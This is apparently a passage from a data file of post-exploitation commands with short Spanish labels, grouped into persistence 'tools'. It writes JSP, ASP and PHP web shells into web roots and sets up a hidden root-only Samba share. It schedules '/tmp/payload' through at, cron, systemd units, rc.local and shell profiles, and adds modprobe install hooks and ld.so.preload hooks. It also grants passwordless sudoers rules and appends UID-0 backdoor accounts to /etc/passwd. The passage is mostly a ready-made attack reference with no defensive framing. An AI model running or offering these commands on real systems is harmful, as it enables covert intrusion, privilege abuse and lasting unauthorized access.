    "cmd": "printf '<%%@ page import=\"java.io.*\" %%><%% Runtime.getRuntime().exec(request.getParameter(\"c\")) %%>' > /var/www/tomcat/x.jsp",
    "desc": "JSP shell"
   },
   {
    "cmd": "echo '<%execute request(\"c\")%>' > /var/www/x.asp",
    "desc": "ASP shell"
   },
   {
    "cmd": "find /var/www -name '*.php' -exec grep -l 'system' {} \\\\;",
    "desc": "Buscar webshells"
   },
   {
    "cmd": "curl -s 'http://IP/x.php?c=whoami'",
    "desc": "Probar webshell"
   },
   {
    "cmd": "echo '<?php include($_GET[\"f\"]); ?>' > /var/www/html/inc.php",
    "desc": "LFI shell"
   },
   {
    "cmd": "ls -la /var/www/html | grep -i '.php'",
    "desc": "Ver PHP"
   },
   {
    "cmd": "chmod 755 /var/www/html/x.php",
    "desc": "Permisos"
   }
  ]
 },
 {
  "tool": "samba4-persist",
  "desc": "Persistencia con servicios Samba",
  "commands": [
   {
    "cmd": "apt install samba && systemctl enable smbd",
    "desc": "Instalar y habilitar"
   },
   {
    "cmd": "echo '[share]' >> /etc/samba/smb.conf && echo 'path = /tmp' >> /etc/samba/smb.conf",
    "desc": "Crear share"
   },
   {
    "cmd": "echo 'valid users = root' >> /etc/samba/smb.conf",
    "desc": "Solo root"
   },
   {
    "cmd": "echo 'browseable = no' >> /etc/samba/smb.conf",
    "desc": "No visible"
   },
   {
    "cmd": "smbpasswd -a root",
    "desc": "Password samba"
   },
   {
    "cmd": "testparm",
    "desc": "Validar config"
   },
   {
    "cmd": "systemctl restart smbd",
    "desc": "Reiniciar"
   },
   {
    "cmd": "smbclient -L localhost",
    "desc": "Ver shares"
   },
   {
    "cmd": "mount -t cifs //localhost/share /mnt -o username=root",
    "desc": "Montar"
   },
   {
    "cmd": "journalctl -u smbd | tail",
    "desc": "Logs"
   }
  ]
 },
 {
  "tool": "at-schtasks-persist",
  "desc": "Persistencia con 'at' y tareas programadas",
  "commands": [
   {
    "cmd": "echo '/tmp/payload' | at now + 1 minute",
    "desc": "En 1 min"
   },
   {
    "cmd": "echo '/tmp/payload' | at 09:00",
    "desc": "A las 9"
   },
   {
    "cmd": "echo '/tmp/payload' | at midnight",
    "desc": "Medianoche"
   },
   {
    "cmd": "echo '/tmp/payload' | at now + 5 minutes",
    "desc": "En 5 min"
   },
   {
    "cmd": "echo '/tmp/payload' | at 09:00 2026-12-31",
    "desc": "Con fecha"
   },
   {
    "cmd": "atq",
    "desc": "Listar"
   },
   {
    "cmd": "at -c 1",
    "desc": "Ver contenido"
   },
   {
    "cmd": "atrm 1",
    "desc": "Borrar"
   },
   {
    "cmd": "echo '0 3 * * * /tmp/payload' | crontab -",
    "desc": "Cron"
   },
   {
    "cmd": "echo '*/10 * * * * root /tmp/payload' >> /etc/crontab",
    "desc": "Cron global"
   },
   {
    "cmd": "echo '@reboot /tmp/payload' | crontab -",
    "desc": "Al boot"
   },
   {
    "cmd": "ls /var/spool/cron/crontabs/",
    "desc": "Crons por usuario"
   },
   {
    "cmd": "cat /var/spool/cron/crontabs/root",
    "desc": "Ver crontab root"
   }
  ]
 },
 {
  "tool": "boot-persist",
  "desc": "Persistencia al arranque (systemd, rc.local)",
  "commands": [
   {
    "cmd": "echo -e '[Unit]\\nDescription=x\\n[Service]\\nExecStart=/tmp/payload\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/x.service",
    "desc": "Unit file"
   },
   {
    "cmd": "systemctl daemon-reload && systemctl enable x",
    "desc": "Habilitar"
   },
   {
    "cmd": "systemctl start x",
    "desc": "Iniciar"
   },
   {
    "cmd": "echo '/tmp/payload' >> /etc/rc.local",
    "desc": "rc.local"
   },
   {
    "cmd": "chmod +x /etc/rc.local",
    "desc": "Permisos"
   },
   {
    "cmd": "echo '/tmp/payload' >> /etc/rc.d/rc.local",
    "desc": "rc.d"
   },
   {
    "cmd": "echo '(sleep 30; /tmp/payload) &' >> /etc/profile",
    "desc": "Profile"
   },
   {
    "cmd": "echo 'if [ -x /tmp/p ]; then /tmp/p; fi' >> /etc/bash.bashrc",
    "desc": "Bash global"
   },
   {
    "cmd": "systemctl list-unit-files | grep enabled | head -20",
    "desc": "Enabled"
   },
   {
    "cmd": "journalctl -u x",
    "desc": "Log servicio"
   },
   {
    "cmd": "ls /etc/init.d/ | head",
    "desc": "Init.d"
   },
   {
    "cmd": "update-rc.d x defaults",
    "desc": "SysV defaults"
   },
   {
    "cmd": "update-rc.d -f x remove",
    "desc": "Quitar"
   },
   {
    "cmd": "grep -r 'payload' /etc/systemd/system/",
    "desc": "Buscar"
   },
   {
    "cmd": "timedatectl set-ntp false && date -s '2026-01-01'",
    "desc": "Cambiar hora"
   }
  ]
 },
 {
  "tool": "kernel-module-persist",
  "desc": "Persistencia con módulos de kernel",
  "commands": [
   {
    "cmd": "echo 'options x /tmp/p' > /etc/modprobe.d/x.conf",
    "desc": "Modprobe conf"
   },
   {
    "cmd": "echo 'install x /tmp/p' > /etc/modprobe.d/x.conf",
    "desc": "Install hook"
   },
   {
    "cmd": "insmod /tmp/x.ko",
    "desc": "Cargar"
   },
   {
    "cmd": "modprobe x",
    "desc": "Modprobe"
   },
   {
    "cmd": "lsmod | grep x",
    "desc": "Ver"
   },
   {
    "cmd": "rmmod x",
    "desc": "Descargar"
   },
   {
    "cmd": "echo 'x' >> /etc/modules",
    "desc": "Cargar al boot"
   },
   {
    "cmd": "grep -r 'install' /etc/modprobe.d/",
    "desc": "Hooks"
   },
   {
    "cmd": "cat /proc/modules | head",
    "desc": "Módulos"
   },
   {
    "cmd": "modinfo x.ko | head -15",
    "desc": "Info módulo"
   },
   {
    "cmd": "dmesg | tail -20",
    "desc": "Kernel log"
   },
   {
    "cmd": "find /lib/modules/$(uname -r) -name '*.ko*' | head -10",
    "desc": "Buscar ko"
   },
   {
    "cmd": "depmod -a",
    "desc": "Depmod"
   }
  ]
 },
 {
  "tool": "sudo-persist-hooks",
  "desc": "Persistencia vía sudoers y librerías",
  "commands": [
   {
    "cmd": "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
    "desc": "Sudoers NOPASSWD"
   },
   {
    "cmd": "echo 'user ALL=(ALL) NOPASSWD: /usr/bin/vim' >> /etc/sudoers",
    "desc": "Vim sudo"
   },
   {
    "cmd": "echo 'user ALL=(ALL:ALL) ALL' >> /etc/sudoers.d/user",
    "desc": "Sudoers.d"
   },
   {
    "cmd": "chmod 440 /etc/sudoers.d/user",
    "desc": "Permisos sudoers"
   },
   {
    "cmd": "sudo -l",
    "desc": "Verificar"
   },
   {
    "cmd": "echo 'export LD_PRELOAD=/tmp/hook.so' > /etc/ld.so.preload",
    "desc": "LD_PRELOAD"
   },
   {
    "cmd": "echo '/tmp/hook.so' >> /etc/ld.so.preload",
    "desc": "Append preload"
   },
   {
    "cmd": "cat /etc/ld.so.preload",
    "desc": "Ver"
   },
   {
    "cmd": "echo 'root:NEWHASH:0:0:root:/root:/bin/bash' >> /etc/passwd",
    "desc": "Backdoor passwd"
   },
   {
    "cmd": "usermod -aG sudo backdoor",
    "desc": "Añadir a sudo"
   },
   {
    "cmd": "echo 'backdoor:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
    "desc": "UID 0 user"
   },
   {
    "cmd": "grep 'NOPASSWD' /etc/sudoers",
    "desc": "Ver NOPASSWD"
   },
   {
    "cmd": "ls -la /etc/sudoers.d/",
    "desc": "Sudoers.d"
   }
  ]
 }
];
